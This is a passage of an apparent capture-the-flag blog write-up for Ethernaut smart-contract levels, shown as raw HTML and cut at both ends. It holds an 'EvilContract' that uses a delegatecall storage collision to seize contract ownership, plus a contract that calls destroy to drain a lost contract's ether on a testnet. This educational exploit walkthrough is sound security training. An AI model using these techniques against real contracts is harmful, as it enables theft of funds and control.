</span></span><span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none;color:#6a9955">6</span><span>  </span><span class="token" style="color:#d4d4d4">}</span><span>
</span></span><span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none;color:#6a9955">7</span>
</span></code></div></pre>
<pre><div class="codeStyle" style="color:#d4d4d4;font-size:13px;text-shadow:none;font-family:Menlo, Monaco, Consolas, &quot;Andale Mono&quot;, &quot;Ubuntu Mono&quot;, &quot;Courier New&quot;, monospace;direction:ltr;text-align:left;white-space:pre;word-spacing:normal;word-break:normal;line-height:1.5;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-hyphens:none;-moz-hyphens:none;-ms-hyphens:none;hyphens:none;padding:1em;margin:.5em 0;overflow:auto;background:#1e1e1e"><code class="language-js" style="color:#d4d4d4;font-size:13px;text-shadow:none;font-family:Menlo, Monaco, Consolas, &quot;Andale Mono&quot;, &quot;Ubuntu Mono&quot;, &quot;Courier New&quot;, monospace;direction:ltr;text-align:left;white-space:pre;word-spacing:normal;word-break:normal;line-height:1.5;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-hyphens:none;-moz-hyphens:none;-ms-hyphens:none;hyphens:none"><span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none;color:#6a9955">1</span><span> </span><span class="token" style="color:#6a9955">// inside the vulnerable contract</span><span>
</span></span><span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none;color:#6a9955">2</span><span> address </span><span class="token" style="color:#569CD6">public</span><span> timeZone1Library</span><span class="token" style="color:#d4d4d4">;</span><span>
</span></span><span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none;color:#6a9955">3</span><span>  address </span><span class="token" style="color:#569CD6">public</span><span> timeZone2Library</span><span class="token" style="color:#d4d4d4">;</span><span>
</span></span><span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none;color:#6a9955">4</span><span>  address </span><span class="token" style="color:#569CD6">public</span><span> owner</span><span class="token" style="color:#d4d4d4">;</span><span> 
</span></span><span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none;color:#6a9955">5</span><span>  uint storedTime</span><span class="token" style="color:#d4d4d4">;</span><span>
</span></span><span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none;color:#6a9955">6</span>
</span></code></div></pre>
<p class="chakra-text css-0" node="[object Object]">I guess you got an idea what will happens with the delegateCall ? <code class="inline-code">storedTime</code> is actually our <code class="inline-code">timeZone1Library</code> variable they are both at <code class="inline-code">slot[0]</code> of the storage so it will be set instead.
and the <code class="inline-code">setSecondTime</code> does the same thing as the <code class="inline-code">setFirstTime</code> in this case.</p>
<div class="css-17l36zw"></div>
<p class="chakra-text css-0" node="[object Object]"><span class="chakra-text css-gv9qss">Exploitation</span></p>
<ol>
<li>Create an evil contract that implements <code class="inline-code">setTime(uint)</code> and has the same storage layout as the vulnerable contract ( by declaring the same variables in the same order 😄)</li>
<li>call the <code class="inline-code">set_X_Time</code> of the vulnerable contract by passing uint(evilcontractAddress) as paramater</li>
<li>call the method again now our evilContract function will be triggered to set owner = ourAccount;</li>
</ol>
<p class="chakra-text css-0" node="[object Object]">Let&#x27;s craft the <em>EvilContract</em></p>
<pre><div class="codeStyle" style="color:#d4d4d4;font-size:13px;text-shadow:none;font-family:Menlo, Monaco, Consolas, &quot;Andale Mono&quot;, &quot;Ubuntu Mono&quot;, &quot;Courier New&quot;, monospace;direction:ltr;text-align:left;white-space:pre;word-spacing:normal;word-break:normal;line-height:1.5;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-hyphens:none;-moz-hyphens:none;-ms-hyphens:none;hyphens:none;padding:1em;margin:.5em 0;overflow:auto;background:#1e1e1e"><code class="language-js" style="color:#d4d4d4;font-size:13px;text-shadow:none;font-family:Menlo, Monaco, Consolas, &quot;Andale Mono&quot;, &quot;Ubuntu Mono&quot;, &quot;Courier New&quot;, monospace;direction:ltr;text-align:left;white-space:pre;word-spacing:normal;word-break:normal;line-height:1.5;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-hyphens:none;-moz-hyphens:none;-ms-hyphens:none;hyphens:none"><span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none;color:#6a9955">1</span><span>contract </span><span class="token" style="color:#4ec9b0">EvilContract</span><span> </span><span class="token" style="color:#d4d4d4">{</span><span>
</span></span><span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none;color:#6a9955">2</span>
</span><span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none;color:#6a9955">3</span><span>  address </span><span class="token" style="color:#569CD6">public</span><span> timeZone1Library</span><span class="token" style="color:#d4d4d4">;</span><span>
</span></span><span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none;color:#6a9955">4</span><span>  address </span><span class="token" style="color:#569CD6">public</span><span> timeZone2Library</span><span class="token" style="color:#d4d4d4">;</span><span>
</span></span><span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none;color:#6a9955">5</span><span>  address </span><span class="token" style="color:#569CD6">public</span><span> owner</span><span class="token" style="color:#d4d4d4">;</span><span> 
</span></span><span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none;color:#6a9955">6</span>  
</span><span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none;color:#6a9955">7</span><span>  </span><span class="token" style="color:#6a9955">// These variable are useless because we won&#x27;t to ensure that the owner is in slot[2] </span><span>
</span></span><span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none;color:#6a9955">8</span><span>  </span><span class="token" style="color:#6a9955">// we don&#x27;t really care about the slots that comes after</span><span>
</span></span><span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none;color:#6a9955">9</span><span>  uint storedTime</span><span class="token" style="color:#d4d4d4">;</span><span>
</span></span><span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none;color:#6a9955">10</span><span>  bytes4 constant setTimeSignature </span><span class="token" style="color:#d4d4d4">=</span><span> </span><span class="token" style="color:#dcdcaa">bytes4</span><span class="token" style="color:#d4d4d4">(</span><span class="token" style="color:#dcdcaa">keccak256</span><span class="token" style="color:#d4d4d4">(</span><span class="token" style="color:#ce9178">&quot;setTime(uint256)&quot;</span><span class="token" style="color:#d4d4d4">)</span><span class="token" style="color:#d4d4d4">)</span><span class="token" style="color:#d4d4d4">;</span><span>
</span></span><span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none;color:#6a9955">11</span>
</span><span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none;color:#6a9955">12</span><span>   </span><span class="token" style="color:#569CD6">function</span><span> </span><span class="token" style="color:#dcdcaa">setTime</span><span class="token" style="color:#d4d4d4">(</span><span class="token" style="color:#9cdcfe">uint _time</span><span class="token" style="color:#d4d4d4">)</span><span> </span><span class="token" style="color:#569CD6">public</span><span> </span><span class="token" style="color:#d4d4d4">{</span><span>
</span></span><span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none;color:#6a9955">13</span><span>    owner </span><span class="token" style="color:#d4d4d4">=</span><span> </span><span class="token" style="color:#b5cea8">0x84e7a3679A82C2766Ff8382862ab883FF9460307</span><span class="token" style="color:#d4d4d4">;</span><span>
</span></span><span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none;color:#6a9955">14</span><span>   </span><span class="token" style="color:#d4d4d4">}</span><span>
</span></span><span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none;color:#6a9955">15</span>
</span><span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none;color:#6a9955">16</span><span>   </span><span class="token" style="color:#569CD6">function</span><span> </span><span class="token" style="color:#dcdcaa">getParam</span><span class="token" style="color:#d4d4d4">(</span><span class="token" style="color:#d4d4d4">)</span><span> view </span><span class="token" style="color:#569CD6">public</span><span> </span><span class="token" style="color:#dcdcaa">returns</span><span> </span><span class="token" style="color:#d4d4d4">(</span><span class="token" style="color:#9cdcfe">uint</span><span class="token" style="color:#d4d4d4">)</span><span class="token" style="color:#d4d4d4">{</span><span>
</span></span><span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none;color:#6a9955">17</span><span>        </span><span class="token" style="color:#c586c0">return</span><span> </span><span class="token" style="color:#dcdcaa">uint</span><span class="token" style="color:#d4d4d4">(</span><span class="token" style="color:#dcdcaa">address</span><span class="token" style="color:#d4d4d4">(</span><span class="token" style="color:#569CD6">this</span><span class="token" style="color:#d4d4d4">)</span><span class="token" style="color:#d4d4d4">)</span><span class="token" style="color:#d4d4d4">;</span><span>
</span></span><span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none;color:#6a9955">18</span><span>   </span><span class="token" style="color:#d4d4d4">}</span><span>
</span></span><span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none;color:#6a9955">19</span><span></span><span class="token" style="color:#d4d4d4">}</span><span>
</span></span><span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none;color:#6a9955">20</span>
</span></code></div></pre>
<p class="chakra-text css-0" node="[object Object]">Challenge solved ✅</p>
<p class="chakra-text css-0" node="[object Object]"><span class="chakra-text css-gv9qss">Further Reading</span> <a class="chakra-link css-9olwc6" href="https://betterprogramming.pub/preventing-smart-contract-attacks-on-ethereum-delegatecall-e864d0042188">Preventing Smart Contract Attacks on Ethereum — “DELEGATECALL”</a></p>
<h2 class="chakra-heading css-1uc67dn" id="recovery">Recovery</h2>
<blockquote>
<p class="chakra-text css-0" node="[object Object]">Forensics in the blockchain world !</p>
</blockquote>
<p class="chakra-text css-0" node="[object Object]"><span class="chakra-text css-gv9qss">Challenge description</span></p>
<p class="chakra-text css-0" node="[object Object]">A contract creator has built a very simple token factory contract. Anyone can create new tokens with ease. After deploying the first token contract, the creator sent 0.001 ether to obtain more tokens. They have since lost the contract address.</p>
<p class="chakra-text css-0" node="[object Object]">This level will be completed if you can recover (or remove) the 0.001 ether from the lost contract address.</p>
<div class="css-17l36zw"></div>
<p class="chakra-text css-0" node="[object Object]"><span class="chakra-text css-gv9qss">Analysis</span></p>
<p class="chakra-text css-0" node="[object Object]"><span class="chakra-text css-gv9qss">the problem</span></p>
<pre><div class="codeStyle" style="color:#d4d4d4;font-size:13px;text-shadow:none;font-family:Menlo, Monaco, Consolas, &quot;Andale Mono&quot;, &quot;Ubuntu Mono&quot;, &quot;Courier New&quot;, monospace;direction:ltr;text-align:left;white-space:pre;word-spacing:normal;word-break:normal;line-height:1.5;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-hyphens:none;-moz-hyphens:none;-ms-hyphens:none;hyphens:none;padding:1em;margin:.5em 0;overflow:auto;background:#1e1e1e"><code class="language-js" style="color:#d4d4d4;font-size:13px;text-shadow:none;font-family:Menlo, Monaco, Consolas, &quot;Andale Mono&quot;, &quot;Ubuntu Mono&quot;, &quot;Courier New&quot;, monospace;direction:ltr;text-align:left;white-space:pre;word-spacing:normal;word-break:normal;line-height:1.5;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-hyphens:none;-moz-hyphens:none;-ms-hyphens:none;hyphens:none"><span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none;color:#6a9955">1</span><span>    </span><span class="token" style="color:#569CD6">new</span><span> </span><span class="token" style="color:#4ec9b0">SimpleToken</span><span class="token" style="color:#d4d4d4">(</span><span>_name</span><span class="token" style="color:#d4d4d4">,</span><span> msg</span><span class="token" style="color:#d4d4d4">.</span><span class="token property-access">sender</span><span class="token" style="color:#d4d4d4">,</span><span> _initialSupply</span><span class="token" style="color:#d4d4d4">)</span><span class="token" style="color:#d4d4d4">;</span><span>
</span></span><span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none;color:#6a9955">2</span>
</span></code></div></pre>
<blockquote>
<p class="chakra-text css-0" node="[object Object]">A contract can create other contracts using the new keyword. The full code of the contract being created has to be known when the creating contract is compiled so recursive creation-dependencies are not possible.</p>
</blockquote>
<p class="chakra-text css-0" node="[object Object]"><a class="chakra-link css-9olwc6" href="https://docs.soliditylang.org/en/v0.8.15/control-structures.html?highlight=new%20keyword#creating-contracts-via-new">Solidity Docs - New keyword</a></p>
<p class="chakra-text css-0" node="[object Object]">the <code class="inline-code">new</code> keyword returns the address of the created contract but here it&#x27;s not saved and there is no way to retrieve it from the contract state. But we are in the blockchain world where transparency rules ! All transactions are saved and we can actually find the created contract.</p>
<div class="css-17l36zw"></div>
<p class="chakra-text css-0" node="[object Object]"><span class="chakra-text css-gv9qss">Exploitation</span></p>
<ol>
<li>
<p class="chakra-text css-0" node="[object Object]">Go to <a class="chakra-link css-9olwc6" href="https://rinkeby.etherscan.io/">Etherscan</a></p>
</li>
<li>
<p class="chakra-text css-0" node="[object Object]">Search for your instance address</p>
</li>
<li>
<p class="chakra-text css-0" node="[object Object]">You will find something similar to this, click it !
<div class="chakra-stack css-bwdt07"><div class="chakra-stack css-1pb7l90"><div class="css-1ui0t94"><img src="https://res.cloudinary.com/dsdvvwb8v/image/upload/v1659138024/93668187b141f813b187b92cf0e33ff963269e40cd11b36386300e201af120c9_atmryc.png" alt="Recovery instance contract" style="scale:1.2px;width:100%"/></div><p class="chakra-text css-1qz7fzr">Recovery instance contract</p></div></div></p>
</li>
<li>
<p class="chakra-text css-0" node="[object Object]">Check the balance to be sure that it&#x27;s the created contract.</p>
</li>
</ol>
<p class="chakra-text css-0" node="[object Object]"><div class="chakra-stack css-bwdt07"><div class="chakra-stack css-1pb7l90"><div class="css-1ui0t94"><img src="https://res.cloudinary.com/dsdvvwb8v/image/upload/v1659138024/106328b15039a3d164b45720563251c6f628e2907732a9b997514327aac3f457_vnq6mh.png" alt="Recovery created contract" style="scale:1.2px;width:100%"/></div><p class="chakra-text css-1qz7fzr">Recovery created contract</p></div></div></p>
<ol start="6">
<li>call the destroy function with your wallet address as paramater</li>
</ol>
<p class="chakra-text css-0" node="[object Object]">Here is a simple contract to call the destroy function :</p>
<pre><div class="codeStyle" style="color:#d4d4d4;font-size:13px;text-shadow:none;font-family:Menlo, Monaco, Consolas, &quot;Andale Mono&quot;, &quot;Ubuntu Mono&quot;, &quot;Courier New&quot;, monospace;direction:ltr;text-align:left;white-space:pre;word-spacing:normal;word-break:normal;line-height:1.5;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-hyphens:none;-moz-hyphens:none;-ms-hyphens:none;hyphens:none;padding:1em;margin:.5em 0;overflow:auto;background:#1e1e1e"><code class="language-js" style="color:#d4d4d4;font-size:13px;text-shadow:none;font-family:Menlo, Monaco, Consolas, &quot;Andale Mono&quot;, &quot;Ubuntu Mono&quot;, &quot;Courier New&quot;, monospace;direction:ltr;text-align:left;white-space:pre;word-spacing:normal;word-break:normal;line-height:1.5;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-hyphens:none;-moz-hyphens:none;-ms-hyphens:none;hyphens:none"><span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none;color:#6a9955">1</span><span class="token" style="color:#569CD6">interface</span><span> </span><span class="token" style="color:#4ec9b0">SimpleToken</span><span> </span><span class="token" style="color:#d4d4d4">{</span><span>
</span></span><span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none;color:#6a9955">2</span><span>      </span><span class="token" style="color:#569CD6">function</span><span> </span><span class="token" style="color:#dcdcaa">destroy</span><span class="token" style="color:#d4d4d4">(</span><span class="token" style="color:#9cdcfe">address payable _to</span><span class="token" style="color:#d4d4d4">)</span><span> external </span><span class="token" style="color:#d4d4d4">;</span><span> 
</span></span><span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none;color:#6a9955">3</span><span></span><span class="token" style="color:#d4d4d4">}</span><span>
</span></span><span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none;color:#6a9955">4</span>
</span><span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none;color:#6a9955">5</span><span>contract </span><span class="token" style="color:#4ec9b0">Recover</span><span> </span><span class="token" style="color:#d4d4d4">{</span><span>
</span></span><span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none;color:#6a9955">6</span>
</span><span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none;color:#6a9955">7</span><span>    </span><span class="token" style="color:#569CD6">function</span><span> </span><span class="token" style="color:#dcdcaa">recoverFunds</span><span class="token" style="color:#d4d4d4">(</span><span class="token" style="color:#9cdcfe">address contractAddress</span><span class="token" style="color:#d4d4d4">,</span><span class="token" style="color:#9cdcfe"> address payable myAddress</span><span class="token" style="color:#d4d4d4">)</span><span> </span><span class="token" style="color:#569CD6">public</span><span> </span><span class="token" style="color:#d4d4d4">{</span><span>
</span></span><span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none;color:#6a9955">8</span><span>        </span><span class="token" style="color:#6a9955">//  (bool success, ) = contractAddress.call(</span><span>
</span></span><span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none;color:#6a9955">9</span><span>        </span><span class="token" style="color:#6a9955">//     abi.encodeWithSignature(&quot;destroy(address payable)&quot;, myAddress));</span><span>
</span></span><span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none;color:#6a9955">10</span><span>        </span><span class="token" style="color:#6a9955">//  require(success);   </span><span>
</span></span><span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none;color:#6a9955">11</span>
</span><span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none;color:#6a9955">12</span><span>        </span><span class="token" style="color:#6a9955">// or a cleaner way </span><span>
</span></span><span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none;color:#6a9955">13</span><span>        </span><span class="token" style="color:#4ec9b0">SimpleToken</span><span> tokenContract </span><span class="token" style="color:#d4d4d4">=</span><span> </span><span class="token" style="color:#dcdcaa">SimpleToken</span><span class="token" style="color:#d4d4d4">(</span><span>contractAddress</span><span class="token" style="color:#d4d4d4">)</span><span class="token" style="color:#d4d4d4">;</span><span>
</span></span><span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none;color:#6a9955">14</span><span>        tokenContract</span><span class="token" style="color:#d4d4d4">.</span><span class="token method property-access" style="color:#dcdcaa">destroy</span><span class="token" style="color:#d4d4d4">(</span><span>myAddress</span><span class="token" style="color:#d4d4d4">)</span><span class="token" style="color:#d4d4d4">;</span><span>
</span></span><span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none;color:#6a9955">15</span><span>    </span><span class="token" style="color:#d4d4d4">}</span><span>
</span></span><span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none;color:#6a9955">16</span>
</span><span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none;color:#6a9955">17</span><span>    </span><span class="token" style="color:#569CD6">function</span><span> </span><span class="token" style="color:#dcdcaa">verifyBalance</span><span class="token" style="color:#d4d4d4">(</span><span class="token" style="color:#9cdcfe">address contractAddress</span><span class="token" style="color:#d4d4d4">)</span><span> </span><span class="token" style="color:#569CD6">public</span><span> view </span><span class="token" style="color:#dcdcaa">returns</span><span> </span><span class="token" style="color:#d4d4d4">(</span><span class="token" style="color:#9cdcfe">uint</span><span class="token" style="color:#d4d4d4">)</span><span class="token" style="color:#d4d4d4">{</span><span>
</span></span><span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none;color:#6a9955">18</span><span>        </span><span class="token" style="color:#c586c0">return</span><span> contractAddress</span><span class="token" style="color:#d4d4d4">.</span><span class="token property-access">balance</span><span class="token" style="color:#d4d4d4">;</span><span>
</span></span><span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none;color:#6a9955">19</span><span>    </span><span class="token" style="color:#d4d4d4">}</span><span>
</span></span><span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none;color:#6a9955">20</span><span></span><span class="token" style="color:#d4d4d4">}</span><span>
</span></span><span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none;color:#6a9955">21</span>
</span></code></div></pre>
<h2 class="chakra-heading css-1uc67dn" id="magic number">Magic Number</h2>
<p class="chakra-text css-0" node="[object Object]"><span class="chakra-text css-gv9qss">Challenge description</span></p>
<blockquote>
<p class="chakra-text css-0" node="[object Object]">To solve this level, you only need to provide the Ethernaut with a Solver, a contract that responds to whatIsTheMeaningOfLife() with the right number.
Easy right? Well... there&#x27;s a catch.
The solver&#x27;s code needs to be really tiny. Really reaaaaaallly tiny. Like freakin&#x27; really really itty-bitty tiny: 10 opcodes at most.</p>
</blockquote>
<div class="css-17l36zw"></div>
<p class="chakra-text css-0" node="[object Object]"><span class="chakra-text css-gv9qss">Analysis</span></p>
<p class="chakra-text css-0" node="[object Object]">Writing Opcode instead of plain solidity.  <span class="chakra-text css-gv9qss">It&#x27;s not that hard right ?</span> <em>right?</em>
Okay Let&#x27;s dive in one by one till we understand how everything works. I  will be writing some pseudo/solidity code for analogy.</p>
<pre><div class="codeStyle" style="color:#d4d4d4;font-size:13px;text-shadow:none;font-family:Menlo, Monaco, Consolas, &quot;Andale Mono&quot;, &quot;Ubuntu Mono&quot;, &quot;Courier New&quot;, monospace;direction:ltr;text-align:left;white-space:pre;word-spacing:normal;word-break:normal;line-height:1.5;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-hyphens:none;-moz-hyphens:none;-ms-hyphens:none;hyphens:none;padding:1em;margin:.5em 0;overflow:auto;background:#1e1e1e"><code class="language-js" style="color:#d4d4d4;font-size:13px;text-shadow:none;font-family:Menlo, Monaco, Consolas, &quot;Andale Mono&quot;, &quot;Ubuntu Mono&quot;, &quot;Courier New&quot;, monospace;direction:ltr;text-align:left;white-space:pre;word-spacing:normal;word-break:normal;line-height:1.5;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-hyphens:none;-moz-hyphens:none;-ms-hyphens:none;hyphens:none"><span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none;color:#6a9955">1</span><span class="token" style="color:#6a9955">//</span><span>
</span></span><span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none;color:#6a9955">2</span><span></span><span class="token" style="color:#569CD6">function</span><span> </span><span class="token" style="color:#dcdcaa">whatIsTheMeaningOfLife</span><span class="token" style="color:#d4d4d4">(</span><span class="token" style="color:#d4d4d4">)</span><span class="token" style="color:#d4d4d4">{</span><span>
</span></span><span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none;color:#6a9955">3</span><span>    </span><span class="token" style="color:#c586c0">return</span><span> </span><span class="token" style="color:#b5cea8">42</span><span class="token" style="color:#d4d4d4">;</span><span>
</span></span><span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none;color:#6a9955">4</span><span></span><span class="token" style="color:#d4d4d4">}</span><span>
</span></span><span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none;color:#6a9955">5</span>
</span><span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none;color:#6a9955">6</span>
</span></code></div></pre>
<p class="chakra-text css-0" node="[object Object]"><code class="inline-code">a contract that responds to whatIsTheMeaningOfLife()</code> fallback function can answer that so let&#x27;s make things more simple</p>
<pre><div class="codeStyle" style="color:#d4d4d4;font-size:13px;text-shadow:none;font-family:Menlo, Monaco, Consolas, &quot;Andale Mono&quot;, &quot;Ubuntu Mono&quot;, &quot;Courier New&quot;, monospace;direction:ltr;text-align:left;white-space:pre;word-spacing:normal;word-break:normal;line-height:1.5;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-hyphens:none;-moz-hyphens:none;-ms-hyphens:none;hyphens:none;padding:1em;margin:.5em 0;overflow:auto;background:#1e1e1e"><code class="language-js" style="color:#d4d4d4;font-size:13px;text-shadow:none;font-family:Menlo, Monaco, Consolas, &quot;Andale Mono&quot;, &quot;Ubuntu Mono&quot;, &quot;Courier New&quot;, monospace;direction:ltr;text-align:left;white-space:pre;word-spacing:normal;word-break:normal;line-height:1.5;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-hyphens:none;-moz-hyphens:none;-ms-hyphens:none;hyphens:none"><span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none;color:#6a9955">1</span><span class="token" style="color:#569CD6">function</span><span class="token" style="color:#d4d4d4">(</span><span class="token" style="color:#d4d4d4">)</span><span class="token" style="color:#d4d4d4">{</span><span>
</span></span><span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none;color:#6a9955">2</span><span>    </span><span class="token" style="color:#c586c0">return</span><span> </span><span class="token" style="color:#b5cea8">42</span><span class="token" style="color:#d4d4d4">;</span><span>
</span></span><span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none;color:#6a9955">3</span><span></span><span class="token" style="color:#d4d4d4">}</span><span>
</span></span><span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none;color:#6a9955">4</span>
</span></code></div></pre>
<p class="chakra-text css-0" node="[object Object]">Let&#x27;s translate it line by line to opcode. I found this magnificent reference <a class="chakra-link css-9olwc6" href="https://www.ethervm.io/#02">EtherVM</a>. I really like the table view instead of navigating page by page through the <a class="chakra-link css-9olwc6" href="https://ethereum.github.io/yellowpaper/paper.pdf">Ethereum Yellow Paper</a>.</p>
<pre><div class="codeStyle" style="color:#d4d4d4;font-size:13px;text-shadow:none;font-family:Menlo, Monaco, Consolas, &quot;Andale Mono&quot;, &quot;Ubuntu Mono&quot;, &quot;Courier New&quot;, monospace;direction:ltr;text-align:left;white-space:pre;word-spacing:normal;word-break:normal;line-height:1.5;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-hyphens:none;-moz-hyphens:none;-ms-hyphens:none;hyphens:none;padding:1em;margin:.5em 0;overflow:auto;background:#1e1e1e"><code class="language-js" style="color:#d4d4d4;font-size:13px;text-shadow:none;font-family:Menlo, Monaco, Consolas, &quot;Andale Mono&quot;, &quot;Ubuntu Mono&quot;, &quot;Courier New&quot;, monospace;direction:ltr;text-align:left;white-space:pre;word-spacing:normal;word-break:normal;line-height:1.5;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-hyphens:none;-moz-hyphens:none;-ms-hyphens:none;hyphens:none"><span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none;color:#6a9955">1</span><span class="token" style="color:#c586c0">return</span><span> </span><span class="token" style="color:#b5cea8">42</span><span class="token" style="color:#d4d4d4">;</span><span> 
